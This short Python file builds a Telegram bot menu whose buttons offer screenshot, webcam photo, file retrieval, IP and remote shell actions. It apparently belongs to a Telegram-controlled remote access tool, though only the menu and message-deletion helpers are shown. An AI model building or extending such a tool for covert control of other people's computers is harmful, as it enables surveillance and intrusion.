from time import sleep
import telebot
from telebot import types

def homepage(bot,message, text):
    # Butonları oluştur
    markup = types.InlineKeyboardMarkup(row_width=2)
    list_button = types.InlineKeyboardButton("List", callback_data="/home")
    ip_button = types.InlineKeyboardButton("IP", callback_data="ip")
    sendmsg_button = types.InlineKeyboardButton("Send Message", callback_data="sendmsg")
    ss_button = types.InlineKeyboardButton("Screenshot", callback_data="ss")
    get_file = types.InlineKeyboardButton("Get File", callback_data="getfile")
    shell_button = types.InlineKeyboardButton("Shell", callback_data="shell")
    takefoto_button = types.InlineKeyboardButton("Take Photo", callback_data="takefoto")
    markup.add(ss_button)
    markup.add(list_button, ip_button)
    markup.add(sendmsg_button)
    markup.add(get_file, shell_button)
    markup.add(takefoto_button)
    bot.send_message(message.chat.id, text, reply_markup=markup)

def delete_message_with_buttons(bot, chat_id, message_id):
    # Mesajı sil
    bot.edit_message_reply_markup(chat_id, message_id, reply_markup=None)
    sleep(0.1)

def delete_message(bot, chat_id, message_id):
    # Mesajı sil
    bot.delete_message(chat_id, message_id - 1)

